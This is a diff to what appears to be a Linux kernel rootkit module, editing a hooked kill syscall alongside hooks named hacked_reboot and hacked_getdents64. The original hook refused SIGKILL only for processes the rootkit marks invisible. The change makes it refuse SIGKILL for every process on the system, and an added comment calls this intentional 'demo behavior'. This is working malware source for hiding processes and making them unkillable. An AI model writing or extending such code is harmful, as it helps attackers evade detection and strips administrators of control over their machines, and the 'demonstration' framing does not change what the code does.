@@ -120,16 +120,19 @@ static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs)
 static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 {
 	// On arm64/x86_64: kill(2) signature is kill(pid, sig) — sig is the 2nd argument (regs[1]).
-	pid_t pid = (pid_t) pt_regs->regs[0];
 	int sig = (int) pt_regs->regs[1];
 	printk(KERN_INFO "enter hacked kill section.\n");
 
-	// Only intercept SIGKILL for processes marked invisible; pass through all others.
-	if (sig == 9 && is_invisible(pid)) {
-		printk(KERN_INFO "kill signal intercepted and denied for invisible pid %d.\n", pid);
-		return 0;
+	// Demo behavior: intercept SIGKILL system-wide to show a syscall hook can make
+	// any process unkillable. This is intentional for demonstration purposes.
+	switch (sig) {
+		case 9:
+			printk(KERN_INFO "kill signal intercepted and denied.\n");
+			break;
+		default:
+			return orig_kill(pt_regs);
 	}
-	return orig_kill(pt_regs);
+	return 0;
 }
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) 
